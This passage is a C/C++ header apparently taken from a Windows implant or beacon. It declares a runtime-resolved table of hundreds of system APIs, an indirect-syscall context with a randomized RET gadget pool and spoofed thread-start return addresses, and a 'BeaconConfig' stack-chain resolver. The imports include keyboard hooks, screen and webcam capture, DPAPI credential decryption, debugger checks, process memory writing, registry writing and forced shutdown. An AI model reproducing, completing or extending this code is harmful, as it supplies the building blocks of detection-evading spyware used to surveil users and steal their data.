 * \param Buffer A pointer to a buffer that receives the contents from the address space of the specified process.
 * \param NumberOfBytesToRead The number of bytes to be read from the specified process.
 * \param NumberOfBytesRead A pointer to a variable that receives the number of bytes transferred into the specified buffer.
 * \return NTSTATUS Successful or errant status.
 */
typedef NTSTATUS (NTAPI *pNtReadVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _Out_writes_bytes_to_(NumberOfBytesToRead, *NumberOfBytesRead) PVOID Buffer,
    _In_ SIZE_T NumberOfBytesToRead,
    _Out_opt_ PSIZE_T NumberOfBytesRead
    );

/**
 * Creates a new process with extended options.
 *
 * \param ProcessHandle A pointer to a handle that receives the process object handle.
 * \param DesiredAccess The access rights desired for the process object.
 * \param ObjectAttributes Optional. A pointer to an OBJECT_ATTRIBUTES structure that specifies the attributes of the new process.
 * \param ParentProcess A handle to the parent process.
 * \param Flags Flags that control the creation of the process. These flags are defined as PROCESS_CREATE_FLAGS_*.
 * \param SectionHandle Optional. A handle to a section object to be used for the new process.
 * \param DebugPort Optional. A handle to a debug port to be used for the new process.
 * \param TokenHandle Optional. A handle to an access token to be used for the new process.
 * \param Reserved Reserved for future use. Must be zero.
 * \return NTSTATUS Successful or errant status.
 */
typedef NTSTATUS (NTAPI *pNtCreateProcessEx)(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ParentProcess,
    _In_ ULONG Flags, // PROCESS_CREATE_FLAGS_*
    _In_opt_ HANDLE SectionHandle,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE TokenHandle,
    _Reserved_ ULONG Reserved // JobMemberLevel
    );


typedef enum _EVENT_TYPE
{
    NotificationEvent,
    SynchronizationEvent
} EVENT_TYPE;

typedef NTSTATUS(NTAPI* pNtCreateEvent)(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES object_attributes, EVENT_TYPE EventType,
    BOOLEAN InitialState);
  typedef NTSTATUS (NTAPI* pNtDelayExecution)(
    _In_ BOOLEAN Alertable,
    _In_ PLARGE_INTEGER DelayInterval
    );
typedef WINBOOL (WINAPI* pDisableThreadLibraryCalls) (HMODULE hLibModule);

typedef NTSTATUS (NTAPI* pTpAllocWork)(
    _Out_ PTP_WORK *WorkReturn,
    _In_ PTP_WORK_CALLBACK Callback,
    _Inout_opt_ PVOID Context,
    _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron
    );
typedef VOID (NTAPI* pTpPostWork)(
    _Inout_ PTP_WORK Work
    );
typedef VOID (NTAPI* pTpReleaseWork)(
    _Inout_ PTP_WORK Work
    );

typedef struct _I_SYSCALLS_CTX {
    PVOID exceptionHandlerHandle;
    HANDLE myThread;
    HANDLE hNtdll;
    UINT64 ntFunctionAddress;
    UINT64 k32FunctionAddress;
    RET_GADGET gadgetTable[MAX_RET_GADGETS];  /* randomized RET gadget pool */
    int      gadgetCount;                      /* number of collected gadgets */
    UINT64 stackArgs[STACK_ARGS_LENGTH];
    UINT64 callRegGadgetAddress;
    UINT64 callRegGadgetAddressRet;
    char callRegGadgetValue;
    UINT64 regBackup;
    UINT64 cachedSSN;              // WORD promoted to UINT64
    UINT64 cachedSyscallRetAddr;   // syscall;ret address in target stub
    UINT64 pivotApiAddr;           // NtWaitForSingleObject address
    UINT64 threadInitThunkRetAddr;   // kernel32!BaseThreadInitThunk + 0x14
    UINT64 rtlUserThreadStartAddr;   // ntdll!RtlUserThreadStart + 0x21

} I_SYSCALLS_CTX, *PI_SYSCALLS_CTX;

typedef struct _INTERNAL_PARAMETERS { /* Custom struct to keep some params in check */
  HANDLE  processID;
  DWORD   threadID;
  HANDLE  processHeap;
  PTEB  TEB;
  PPEB PEB;
  bool areSyscallsInitialized;
  PI_SYSCALLS_CTX syscalls_ctx;
} INTERNAL_PARAMETERS, *PINTERNAL_PARAMETERS;

/* To create a Pandragon Host interface, we would need a VERSION enum, 
*   a "createdBy" field so we know if the interface was created by us or by a third party
*   
*/

// To be fully frank this struct should definitely be reworked or something,
//  its over 150 lines lol

typedef struct {
    INTERNAL_PARAMETERS parameters;
    DWORD loadedModules;  /* Bitmask of loaded Module IDs for lazy loading */
    /* ----- msvcrt.dll ----------------------------------------------------- */
#ifdef DEBUG
    pPrintf printf;
    pPuts   puts;
#endif

    /* ----- NTAPIs (ntdll) ------------------------------------------------- */
    pNtClose                                NtClose;
    pNtCreateFile                           NtCreateFile;
    pNtDeviceIoControlFile                  NtDeviceIoControlFile;
    pNtCreateUserProcess                    NtCreateUserProcess;
    pNtCreateThreadEx                       NtCreateThreadEx;
    pNtQueryDirectoryFile                   NtQueryDirectoryFile;
    pNtQueryVolumeInformationFile           NtQueryVolumeInformationFile;
    pNtQueryInformationFile                 NtQueryInformationFile;
    pNtReadFile                             NtReadFile;
    pNtWriteFile                            NtWriteFile;
    pNtSetInformationFile                   NtSetInformationFile;
    pNtOpenFile                             NtOpenFile;
    pNtDeleteFile                           NtDeleteFile;
    pNtCreateProcess                        NtCreateProcess;
    pNtOpenProcess                          NtOpenProcess;
    pNtTerminateProcess                     NtTerminateProcess;
    pNtTerminateThread                      NtTerminateThread;
    pNtWaitForSingleObject                  NtWaitForSingleObject;
    pNtAllocateVirtualMemory                NtAllocateVirtualMemory;
    pNtProtectVirtualMemory                 NtProtectVirtualMemory;
    pNtWriteVirtualMemory                   NtWriteVirtualMemory;
    pNtResumeThread                         NtResumeThread;
    pNtContinue                             NtContinue;
    pNtGetContextThread                     NtGetContextThread;
    pNtSetContextThread                     NtSetContextThread;
    pRtlCreateTimerQueue                    RtlCreateTimerQueue;
    pRtlCreateTimer                         RtlCreateTimer;
    pNtQueryVirtualMemory                   NtQueryVirtualMemory;
    pNtFreeVirtualMemory                    NtFreeVirtualMemory;
    pNtCreateSection                        NtCreateSection;
    pNtOpenSection                          NtOpenSection;
    pNtMapViewOfSection                     NtMapViewOfSection;
    pNtUnmapViewOfSection                   NtUnmapViewOfSection;
    pNtOpenDirectoryObject                  NtOpenDirectoryObject;
    pNtQueryInformationProcess              NtQueryInformationProcess;
    pNtFlushInstructionCache                NtFlushInstructionCache;
    pNtQuerySystemInformation               NtQuerySystemInformation;
    pNtInitiatePowerAction                  NtInitiatePowerAction;
    pRtlQueueWorkItem                       RtlQueueWorkItem;
    pNtCreateEvent                          NtCreateEvent;
    pNtDelayExecution                       NtDelayExecution;
    pNtQuerySystemTime                      NtQuerySystemTime;
    pRtlCreateProcessParametersEx           RtlCreateProcessParametersEx;
    pRtlCaptureContext                      RtlCaptureContext;
    pRtlFreeHeap                            RtlFreeHeap;
    pRtlAllocateHeap                        RtlAllocateHeap;
    pRtlRandomEx                            RtlRandomEx;
    pRtlWaitOnAddress                       RtlWaitOnAddress;
    pRtlWakeByAddressSingle                 RtlWakeByAddressSingle;
    pLdrLoadDll                             LdrLoadDll;
    pNtSetEvent                             NtSetEvent;
    pNtOpenKey                              NtOpenKey;
    pNtQueryValueKey                        NtQueryValueKey;
    pNtSetValueKey                          NtSetValueKey;
    pRtlFormatCurrentUserKeyPath            RtlFormatCurrentUserKeyPath;
    pRtlFreeUnicodeString                   RtlFreeUnicodeString;
    pRtlInitUnicodeString                   RtlInitUnicodeString;
    pNtSetInformationThread                 NtSetInformationThread;
    pNtQueryInformationThread               NtQueryInformationThread;
    pNtOpenThread                           NtOpenThread;
    pNtSuspendThread                        NtSuspendThread;

    pTpReleaseWork                          TpReleaseWork;
    pTpPostWork                             TpPostWork;
    pTpAllocWork                            TpAllocWork;
    pRtlTimeToSecondsSince1970              RtlTimeToSecondsSince1970;
    pRtlDosPathNameToRelativeNtPathName_U   RtlDosPathNameToRelativeNtPathName_U;
    pNtReadVirtualMemory                    NtReadVirtualMemory;
    pNtCreateProcessEx                      NtCreateProcessEx;

    /* ----- win32u.dll (user/gdi system-calls) ----------------------------- */
    pNtUserGetForegroundWindow              NtUserGetForegroundWindow;
    pNtUserTranslateMessage                 NtUserTranslateMessage;
    pNtUserUnhookWindowsHookEx              NtUserUnhookWindowsHookEx;
    pNtUserSetWindowsHookAW                 NtUserSetWindowsHookAW;
    pNtUserInternalGetWindowText            NtUserInternalGetWindowText;
    pNtUserDispatchMessage                  NtUserDispatchMessage;
    pNtUserGetMessage                       NtUserGetMessage;

    /* ----- kernel32.dll --------------------------------------------------- */
    pGlobalMemoryStatusEx                   GlobalMemoryStatusEx;
    pCreateProcessA                         CreateProcessA;
    pCreateProcessW                         CreateProcessW;
    pReadFile                               ReadFile;
    pCreateFileA                            CreateFileA;
    pCreateFileW                            CreateFileW;
    // Named pipe
    pCreateNamedPipeW                       CreateNamedPipeW;
    pConnectNamedPipe                       ConnectNamedPipe;
    pWaitNamedPipeW                         WaitNamedPipeW;
    pDisconnectNamedPipe                    DisconnectNamedPipe;
    pSetNamedPipeHandleState                SetNamedPipeHandleState;
    pWriteFile                              WriteFile;
    pGetFileSize                            GetFileSize;
    pGetFileSizeEx                          GetFileSizeEx;
    pCreatePipe                             CreatePipe;
    pSetHandleInformation                   SetHandleInformation;
    pSleep                                  Sleep;
    pGetFileAttributesA                     GetFileAttributesA;
    pGetFileAttributesW                     GetFileAttributesW;
    pFindFirstFileA                         FindFirstFileA;
    pFindFirstFileW                         FindFirstFileW;
    pFindNextFileA                          FindNextFileA;
    pFindNextFileW                          FindNextFileW;
    pGetCurrentDirectoryA                   GetCurrentDirectoryA;
    pGetCurrentDirectoryW                   GetCurrentDirectoryW;
    pDeleteFileA                            DeleteFileA;
    pDeleteFileW                            DeleteFileW;
    pMultiByteToWideChar                    MultiByteToWideChar;
    pWideCharToMultiByte                    WideCharToMultiByte;
    pGetModuleFileNameA                     GetModuleFileNameA;
    pGetModuleFileNameW                     GetModuleFileNameW;
    pCopyFileA                              CopyFileA;
    pCopyFileW                              CopyFileW;
    pCreateMutexW                           CreateMutexW;
    pOpenMutexW                             OpenMutexW;
    pLoadLibraryA                           LoadLibraryA;
    pLoadLibraryW                           LoadLibraryW;
    pSetFileAttributesA                     SetFileAttributesA;
    pSetFileAttributesW                     SetFileAttributesW;
    pGetTickCount                           GetTickCount;
    pGetDiskFreeSpaceExW                    GetDiskFreeSpaceExW;
    pGetLastError                           GetLastError;
    pCheckRemoteDebuggerPresent             CheckRemoteDebuggerPresent;
    pGetSystemTimeAsFileTime                GetSystemTimeAsFileTime;
    pFileTimeToSystemTime                   FileTimeToSystemTime;
    pProcess32FirstW                        Process32FirstW;
    pProcess32NextW                         Process32NextW;
    pCreateToolhelp32Snapshot               CreateToolhelp32Snapshot;
    pGetWindowsDirectoryW                   GetWindowsDirectoryW;
    pGetLogicalDriveStringsW                GetLogicalDriveStringsW;
    pGetDriveTypeW                          GetDriveTypeW;
    pCreateEventW                           CreateEventW;
    pResetEvent                             ResetEvent;
    pWaitForSingleObject                    WaitForSingleObject;
    pPeekNamedPipe                          PeekNamedPipe;
    pLocalAlloc                             LocalAlloc;
    pLocalFree                              LocalFree;
    pGetSystemInfo                          GetSystemInfo;
    pGetComputerNameW                       GetComputerNameW;
    pGetComputerNameExW                     GetComputerNameExW;
    pQueryFullProcessImageNameW             QueryFullProcessImageNameW;
    pIsWow64Process                         IsWow64Process;
    pGetConsoleWindow                       GetConsoleWindow;
    pGetThreadContext                       GetThreadContext;
    pSetThreadContext                       SetThreadContext;
    pRtlAddVectoredExceptionHandler         RtlAddVectoredExceptionHandler;
    pRtlRemoveVectoredExceptionHandler      RtlRemoveVectoredExceptionHandler;
    pGetModuleHandleW                       GetModuleHandleW;
    pFindResourceA                          FindResourceA;
    pFindResourceW                          FindResourceW;
    pLoadResource                           LoadResource;
    pSizeofResource                         SizeofResource;
    pLockResource                           LockResource;
    pEnumSystemLocalesW                     EnumSystemLocalesW;
    pMessageBoxA                            MessageBoxA;
    pDisableThreadLibraryCalls              DisableThreadLibraryCalls;
    pGetEnvironmentVariableW                GetEnvironmentVariableW;
    pFlushFileBuffers                       FlushFileBuffers;

    /* ----- advapi32.dll --------------------------------------------------- */
    pGetUserNameW                           GetUserNameW;
    pRegOpenKeyExA                          RegOpenKeyExA;
    pRegOpenKeyExW                          RegOpenKeyExW;
    pRegQueryValueExW                       RegQueryValueExW;
    pRegSetValueExA                         RegSetValueExA;
    pRegSetValueExW                         RegSetValueExW;
    pRegCloseKey                            RegCloseKey;
    pCryptReleaseContext                    CryptReleaseContext;
    pCryptDestroyHash                       CryptDestroyHash;
    pCryptGetHashParam                      CryptGetHashParam;
    pCryptBinaryToStringA                   CryptBinaryToStringA;
    pCryptBinaryToStringW                   CryptBinaryToStringW;
    pCryptAcquireContextW                   CryptAcquireContextW;
    pCryptHashData                          CryptHashData;
    pCryptCreateHash                        CryptCreateHash;
    pCryptGenRandom                         CryptGenRandom;
    pLookupPrivilegeValueW                  LookupPrivilegeValueW;
    pAdjustTokenPrivileges                  AdjustTokenPrivileges;
    pOpenProcessToken                       OpenProcessToken;
    pGetTokenInformation                    GetTokenInformation;

    /* ----- user32.dll ----------------------------------------------------- */
    pGetSystemMetrics                       GetSystemMetrics;
    pPostMessageW                           PostMessageW;
    pCallNextHookEx                         CallNextHookEx;
    pUnhookWindowsHookEx                    UnhookWindowsHookEx;
    pKillTimer                              KillTimer;
    pTranslateMessage                       TranslateMessage;
    pDispatchMessageA                       DispatchMessageA;
    pGetMessageW                            GetMessageW;
    pSetWindowsHookExW                      SetWindowsHookExW;
    pCreateWindowExW                        CreateWindowExW;
    pRegisterClassW                         RegisterClassW;
    pGetSysColorBrush                       GetSysColorBrush;
    pLoadCursorW                            LoadCursorW;
    pGetCursorPos                           GetCursorPos;
    pFindWindowW                            FindWindowW;
    pSetTimer                               SetTimer;
    pDestroyWindow                          DestroyWindow;
    pGetWindowRect                          GetWindowRect;
    pGetClientRect                          GetClientRect;
    pDefWindowProcW                         DefWindowProcW;
    pMessageBeep                            MessageBeep;
    pShowWindow                             ShowWindow;
    pGetDoubleClickTime                     GetDoubleClickTime;
    pSendMessageA                           SendMessageA;
    pSendMessageW                           SendMessageW;
    pExitWindowsEx                          ExitWindowsEx;
    pGetKeyboardLayoutList                  GetKeyboardLayoutList;

    /* ----- gdi32.dll (graphical) ----------------------------------------- */
    pGetDC                                  GetDC;
    pCreateCompatibleDC                     CreateCompatibleDC;
    pCreateCompatibleBitmap                 CreateCompatibleBitmap;
    pSelectObject                           SelectObject;
    pBitBlt                                 BitBlt;
    pGetObjectW                             GetObjectW;
    pGetDIBits                              GetDIBits;
    pReleaseDC                              ReleaseDC;
    pDeleteObject                           DeleteObject;
    pDeleteDC                               DeleteDC;

    /* ----- shell32.dll ---------------------------------------------------- */
    pSHGetFolderPathW                       SHGetFolderPathW;

    /* ----- crypt32.dll ---------------------------------------------------- */
    pCryptUnprotectData                     CryptUnprotectData;
    pCryptStringToBinaryA                   CryptStringToBinaryA;
    pCryptStringToBinaryW                   CryptStringToBinaryW;
    pCertFreeCertificateContext             CertFreeCertificateContext;
    pCertDuplicateCertificateContext        CertDuplicateCertificateContext;
    pCertGetIssuerCertificateFromStore      CertGetIssuerCertificateFromStore;
    pCertVerifySubjectCertificateContext    CertVerifySubjectCertificateContext;
    pCertCreateCertificateContext           CertCreateCertificateContext;
    pCertSetCertificateContextProperty      CertSetCertificateContextProperty;
    pCertGetCertificateContextProperty      CertGetCertificateContextProperty;

    /* ----- winhttp.dll ---------------------------------------------------- */
    pWinHttpOpen                            WinHttpOpen;
    pWinHttpConnect                         WinHttpConnect;
    pWinHttpOpenRequest                     WinHttpOpenRequest;
    pWinHttpSendRequest                     WinHttpSendRequest;
    pWinHttpReceiveResponse                 WinHttpReceiveResponse;
    pWinHttpQueryHeaders                    WinHttpQueryHeaders;
    pWinHttpReadData                        WinHttpReadData;
    pWinHttpCrackUrl                        WinHttpCrackUrl;
    pWinHttpSetOption                       WinHttpSetOption;
    pWinHttpAddRequestHeaders               WinHttpAddRequestHeaders;
    pWinHttpQueryDataAvailable              WinHttpQueryDataAvailable;
    pWinHttpSetTimeouts                     WinHttpSetTimeouts;
    /* pNtClose is already declared above (WinHttpCloseHandle wrapper) */

    /* ----- ws2_32.dll ----------------------------------------------------- */
    pWSAStartup                             WSAStartup;
    pWSACleanup                             WSACleanup;
    pWSAGetLastError                        WSAGetLastError;
    paccept                                 accept;
    psend                                   send;
    precv                                   recv;
    pbind                                   bind;
    pclosesocket                            closesocket;
    pgetaddrinfo                            getaddrinfo;
    pfreeaddrinfo                           freeaddrinfo;
    pconnect                                connect;
    pIoctlsocket                            Ioctlsocket;
    pGetpeername                            Getpeername;
    pGetsockname                            Getsockname;
    pGetsockopt                             Getsockopt;
    psocket                                 socket;
    pinet_addr                              inet_addr;
    pselect                                 select;
    p__WSAFDIsSet                           __WSAFDIsSet;
    pInetNtopA                              InetNtopA;

    /* ----- secur32.dll (SSPI/SChannel) ------------------------------------ */
    pAcquireCredentialsHandleA              AcquireCredentialsHandleA;
    pAcquireCredentialsHandleW              AcquireCredentialsHandleW;
    pInitializeSecurityContextA             InitializeSecurityContextA;
    pInitializeSecurityContextW             InitializeSecurityContextW;
    pCompleteAuthToken                      CompleteAuthToken;
    pQueryContextAttributes                 QueryContextAttributes;
    pFreeContextBuffer                      FreeContextBuffer;
    pDeleteSecurityContext                  DeleteSecurityContext;
    pFreeCredentialsHandle                  FreeCredentialsHandle;
    pApplyControlToken                      ApplyControlToken;
    pEncryptMessage                         EncryptMessage;
    pDecryptMessage                         DecryptMessage;
    pQuerySecurityPackageInfoA              QuerySecurityPackageInfoA;
    pQuerySecurityPackageInfoW              QuerySecurityPackageInfoW;
    
    /* bcrypt.dll */
    pBCryptGenRandom                         BCryptGenRandom;
    /* ----- avicap32.dll --------------------------------------------------- */
    pcapCreateCaptureWindowA                capCreateCaptureWindowA;
    pcapCreateCaptureWindowW                capCreateCaptureWindowW;

    /* ----- mpr.dll -------------------------------------------------------- */
    pWNetGetProviderNameW                   WNetGetProviderNameW;

    /* ----- iphlpapi.dll --------------------------------------------------- */
    pGetAdaptersAddresses                   GetAdaptersAddresses;

    /* OLEAUTH */
    pVariantClear VariantClear;
    pVariantInit VariantInit;

} functionTable, *pfunctionTable;


VOID __RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);
HMODULE __LoadLibraryW(functionTable* funcTable, PWCHAR dllName);

typedef struct _RTL_BUFFER
{
    PUCHAR Buffer;
    PUCHAR StaticBuffer;
    SIZE_T Size;
    SIZE_T StaticSize;
} RTL_BUFFER, *PRTL_BUFFER;

typedef struct _RTL_UNICODE_STRING_BUFFER
{
    UNICODE_STRING String;
    RTL_BUFFER ByteBuffer;
    UCHAR MinimumStaticBufferForTerminalNul[2];
} RTL_UNICODE_STRING_BUFFER, *PRTL_UNICODE_STRING_BUFFER;

FARPROC GetExportedFunctionAddress(void *moduleBase, const char *functionName, LOADLIBRARYA pLoadLibraryA);

HMODULE GetModuleBaseAddress(LPCWSTR ModuleName);
HMODULE GetModuleBaseAddressA(LPCSTR ModuleName);
extern "C"
HMODULE __LoadLibraryA(LPCSTR dllName);
extern "C" void __FreeLibrary(HMODULE hMod);

FARPROC WINAPI __GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
UINT64 GetSymbolAddress(UINT64 moduleBase, const char* functionName);

struct BeaconConfig;
void ResolveStackChain(functionTable* funcTable, BeaconConfig* config);

HANDLE __GetProcessHeap(PPEB PEB);
PROC_ENTRY * __getRunningProcesses(functionTable* funcTable, DWORD *count);

DWORD __getCurrentThreadID(void);
PTEB __getCurrentTEB(PPEB PEB);
HANDLE __getCurrentProcessID(void);

DWORD __WaitForSingleObject(functionTable* funcTable, HANDLE hHandle, DWORD dwMilliseconds);

BOOL __DeviceIoControl(
    functionTable* funcTable,
    HANDLE hDevice,
    DWORD dwIoControlCode,
    LPVOID lpInBuffer,
    DWORD nInBufferSize,
    LPVOID lpOutBuffer,
    DWORD nOutBufferSize,
    LPDWORD lpBytesReturned,
    LPOVERLAPPED lpOverlapped
);

PPEB getCurrentPEB(void);

bool __stdcall __RevertToSelf(void);
bool __stdcall __SetThreadToken(PHANDLE Thread, HANDLE Token);

#ifdef __cplusplus
}
#endif

functionTable* InitializeFunctionTable(void);
functionTable* InitializeFunctionTable(bool initWin32API, bool initWin32u, bool _initWin32uSyscalls, bool _initSyscalls);

/**
 * @brief Layer indirect syscall support on top of an already-initialized functionTable.
 * Calls initSyscalls(SYSCALLS_ID::HWSYSCALLS) then setNTAPISyscalls(funcTable).
 * No-op if funcTable is NULL.
 */
void initSyscallsLayer(functionTable* funcTable);

/**
 * REQUIRES_MODULE - Lazy-load a module before using its function pointers.
 *
 * Usage:
 *   REQUIRES_MODULE(funcTable, ModuleCache::Module::ADVAPI32);
 *   funcTable->RegOpenKeyExA(...);
 *
 * If the module is already loaded, this is a single bitmask check (zero API calls).
 * If not loaded, calls the appropriate loader for the module.
 */
#define REQUIRES_MODULE(nt, modId) \
    do { \
        if (!((nt)->loadedModules & (1u << static_cast<int>(modId)))) { \
            if (!ModuleCache::LoadModule<(modId)>((nt))) { \
                c_debugPrint(nt, "[REQUIRES_MODULE] Failed to load module %d", (int)(modId)); \
            } \
        } \
    } while(0)

#ifndef SECURITY_STATUS
typedef LONG SECURITY_STATUS;
#endif
NTSTATUS deleteFromPATH(functionTable* f, const wchar_t *dir);
NTSTATUS appendToPATH(functionTable* f, const wchar_t *dir);

const void* load_resource(functionTable* funcTable, HMODULE hMod, DWORD id,
                          const wchar_t* type, DWORD* out_len);

PVOID get_text_section(PVOID moduleBase, DWORD* outSize);

/**
 * Read a file from disk into a heap buffer
 * @param funcTable  Function table
 * @param path         Wide string path to the file (UTF-16LE)
 * @param outSize      Output: number of bytes read
 * @return Pointer to allocated buffer (caller must __free), or NULL on failure
 */
unsigned char* readFileFromDisk(functionTable* funcTable,
                                       const wchar_t* path, DWORD* outSize);

/**
 * Write a buffer to a file on disk 
 * @param funcTable  Function table 
 * @param path         Wide string path to the file (UTF-16LE)
 * @param data         Pointer to data buffer
 * @param dataSize     Size of data to write
 * @return TRUE on success, FALSE on failure
 */
BOOL writeFileToDisk(functionTable* funcTable, const wchar_t* path, const unsigned char* data, DWORD dataSize);

/**
 * Write a chunk of data to a file at a specific offset 
 * @param funcTable  Function table
 * @param path         Wide string path to the file (UTF-16LE)
 * @param data         Pointer to chunk data (NULL to create/truncate file only)
 * @param dataSize     Size of data to write
 * @param byteOffset   Byte offset in file to write at (use -1 to append)
 * @return TRUE on success, FALSE on failure
 */
BOOL writeFileChunkToDisk(functionTable* funcTable, const wchar_t* path, const unsigned char* data, DWORD dataSize, LONGLONG byteOffset);

/**
 * Read a chunk of data from a file at a specific offset
 * @param funcTable  Function table
 * @param path         Wide string path to the file (UTF-16LE)
 * @param outSize      Output: number of bytes actually read
 * @param byteOffset   Byte offset in file to start reading from
 * @param bytesToRead  Maximum number of bytes to read
 * @return Pointer to allocated buffer (caller must __free), or NULL on failure
 */
unsigned char* readFileChunkFromDisk(functionTable* funcTable, const wchar_t* path, DWORD* outSize, LONGLONG byteOffset, DWORD bytesToRead);

/**
 * Generate cryptographically secure random bytes using BCryptGenRandom
 * @param buffer Output buffer for random bytes
 * @param length Number of bytes to generate
 * @return true on success, false on failure
 */
bool generateSecureRandom(functionTable* f, unsigned char* buffer, size_t length);

/**
 * Generate a secure 24-byte nonce for XChaCha20-Poly1305
 * @param nonce Output buffer (must be 24 bytes)
 * @return true on success, false on failure
 */
bool generateSecureNonce(functionTable* f, unsigned char* nonce);

namespace WinUtils {
  /**
  * Generate a random temp file path in format: \\?\{DRIVE}:\Temp\~{RANDOM_HEX}
  * @param funcTable Function table
  * @param outPath     Output buffer (must be at least 260 WCHARs)
  * @return true on success
  */
  bool generateRandomTempPath(functionTable* funcTable, PWCHAR outPath);
  unsigned int getCurrentUnixTime(functionTable* f);
  bool isDateReached(functionTable* f, unsigned int DateUnix);
};

bool doTwoTablesBelongToSameProcess(functionTable* table1, functionTable* table2);
bool doTwoTablesBelongToSameThread(functionTable* table1, functionTable* table2);

namespace ModuleCache {
  /* Module ID enum for cached DLL handle resolution */
  enum class Module : uint32_t
  {
      NONE        = 0,
      KERNEL32    = 1,
      NTDLL       = 2,
      ADVAPI32    = 3,
      USER32      = 4,
      GDI32       = 5,
      SHELL32     = 6,
      OLE32       = 7,
      OLEAUT32    = 8,
      WS2_32      = 9,
      CRYPT32     = 10,
      WINHTTP     = 11,
      SECUR32     = 12,
      BCRYPT      = 13,
      IPHLPAPI    = 14,
      MPR         = 15,
      MSVCRT      = 16,
      MAX         = 17
  };

  /* Module cache entry */
  struct ModuleCacheEntry {
      Module          id;
      HMODULE         handle;
      const wchar_t*  name;
      bool            loaded;
  };

  /* Module cache storage (defined in resolver.cpp) */
  struct ModuleCacheStorage {
      ModuleCacheEntry entries[static_cast<size_t>(Module::MAX)];
      bool             initialized;
  };
  extern ModuleCacheStorage g_moduleCache;

  /* Handle caching mechanism - retrieves cached handle or loads DLL */
  HMODULE GetCachedModuleHandle(functionTable* funcTable, Module moduleId);
  HMODULE GetCachedModuleHandleStatic(Module moduleId);
  void InitModuleCache(void);
  void ClearModuleCache(void);

  /**
   * LoadModule<M>: Template-based compile-time dispatch for lazy module loading.
   *
   * Only specializations actually instantiated at call sites survive LTO.
   * Specializations are defined in resolver.cpp.
   */
  template<Module M>
  bool LoadModule(functionTable* funcTable);
};
